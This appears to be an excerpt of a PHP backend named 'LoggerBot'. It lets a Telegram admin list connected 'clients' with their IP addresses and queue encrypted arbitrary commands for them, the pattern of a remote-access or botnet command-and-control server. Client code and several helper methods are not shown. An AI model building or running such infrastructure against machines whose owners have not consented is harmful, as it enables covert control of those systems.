<?php

class LoggerBot
{
    private function sendTelegramMessage($chatId, $text, $options = [])
    {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";

        $parseMode = stripos($text, 'Error') !== false ? null : 'Markdown';

        $data = array_merge([
            'chat_id' => $chatId,
            'text' => $text
        ], $options);

        if ($parseMode) {
            $data['parse_mode'] = $parseMode;
        }

        if (isset($data['reply_markup'])) {
            $data['reply_markup'] = json_encode($data['reply_markup']);
        }

        $this->logWebhook("Sending Telegram message to chat_id: $chatId, payload: " . json_encode($data));
        $response = $this->makeCurlRequest($url, $data, false);
        $this->logWebhook("Telegram sendMessage response: " . $response);
        return $response;
    }

    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument')
    {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/$method";
        $data = [
            'chat_id' => $chatId,
            $method == 'sendPhoto' ? 'photo' : 'document' => new CURLFile($filePath)
        ];
        $this->logWebhook("Sending Telegram file to chat_id: $chatId, method: $method, file: $filePath");
        $response = $this->makeCurlRequest($url, $data, true);
        $this->logWebhook("Telegram sendFile response: $response");
        return $response;
    }

    private function makeCurlRequest($url, $data, $isFile = false)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);

        if ($isFile) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            $this->logError("cURL error: " . curl_error($ch) . ", URL: $url");
        }
        curl_close($ch);
        return $response;
    }

    private function getClientStatus()
    {
        try {
            $stmt = $this->pdo->prepare("SELECT client_id, ip_address, is_online, last_seen FROM clients WHERE last_seen > NOW() - INTERVAL 1 HOUR");
            $stmt->execute();
            $clients = $stmt->fetchAll();
            $this->logWebhook("Client status query returned: " . json_encode($clients));
            return $clients;
        } catch (PDOException $e) {
            $this->logError("Failed to get client status: " . $e->getMessage());
            return [];
        }
    }

    private function queueClientCommand($clientId, $commandData)
    {
        try {
            $encryptedCommand = $this->encrypt(json_encode($commandData));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
            VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);
            $this->logWebhook("Queued command for client_id: $clientId, command: " . json_encode($commandData));
        } catch (PDOException $e) {
            $this->logError("Failed to queue client command: " . $e->getMessage());
        }
    }

    private function processUpdate($update)
    {
        if (!isset($update['message'])) {
            return;
        }

        $message = $update['message'];
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientExists($clientId)) {
                $this->setSelectedClient($userId, $clientId);
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
                $this->logWebhook("Client selected via /select: $clientId, user_id: $userId, chat_id: $chatId");
            } else {
                $this->sendTelegramMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logError("Invalid client_id in /select: $clientId, user_id: $userId, chat_id: $chatId");
            }
            return;
        }

        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
        } else {
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                $response = $this->processCommand($text, $selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$text' queued for client $selectedClient.");
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        }
    }


    private function updateClientStatus($clientId)
    {
        try {
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
            $stmt = $this->pdo->prepare(
                "INSERT INTO clients (client_id, ip_address, is_online, last_seen, created_at) 
            VALUES (?, ?, 1, NOW(), NOW()) 
            ON DUPLICATE KEY UPDATE is_online = 1, last_seen = NOW(), ip_address = ?"
            );
            $stmt->execute([$clientId, $ipAddress, $ipAddress]);
            $this->logWebhook("Updated client status for client_id: $clientId, ip: $ipAddress");
        } catch (PDOException $e) {
            $this->logError("Failed to update client status: " . $e->getMessage());
        }
    }

    private function getClientCommands($clientId)
    {
        try {
            $stmt = $this->pdo->prepare(
                "SELECT id, command FROM client_commands 
            WHERE client_id = ? AND status = 'pending' 
            LIMIT 10"
            );
            $stmt->execute([$clientId]);
            $commands = $stmt->fetchAll();

            $this->logWebhook("Fetched commands for client_id: $clientId, count: " . count($commands));
            return ['commands' => $commands];
        } catch (PDOException $e) {
            $this->logError("Failed to fetch client commands for client_id: $clientId, error: " . $e->getMessage());
            return ['error' => 'Failed to fetch commands'];
        }
    }

    private function handleWebhook($update)
    {
        if (!$update) {
            http_response_code(400);
            $this->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logWebhook(json_encode($update));

        if (isset($update['callback_query'])) {
            $this->handleCallbackQuery($update['callback_query']);
        } elseif (isset($update['message'])) {
            $this->processUpdate($update);
        }

        http_response_code(200);
    }

    private function setSelectedClient($userId, $clientId)
    {
        try {
            $stmt = $this->pdo->prepare(
                "INSERT INTO user_selections (user_id, selected_client, updated_at) 
            VALUES (?, ?, NOW()) 
            ON DUPLICATE KEY UPDATE selected_client = ?, updated_at = NOW()"
            );
            $stmt->execute([$userId, $clientId, $clientId]);
            $this->logWebhook("Set selected client: $clientId for user_id: $userId");
        } catch (PDOException $e) {
            $this->logError("Failed to set selected client for user_id: $userId, error: " . $e->getMessage());
        }
    }

    private function getSelectedClient($userId)
    {
        try {
            $stmt = $this->pdo->prepare("SELECT selected_client FROM user_selections WHERE user_id = ?");
            $stmt->execute([$userId]);
            $result = $stmt->fetch();
            $clientId = $result ? $result['selected_client'] : null;
            $this->logWebhook("Retrieved selected client: " . ($clientId ?: 'none') . " for user_id: $userId");
            return $clientId;
        } catch (PDOException $e) {
            $this->logError("Failed to get selected client for user_id: $userId, error: " . $e->getMessage());
            return null;
        }
    }
}
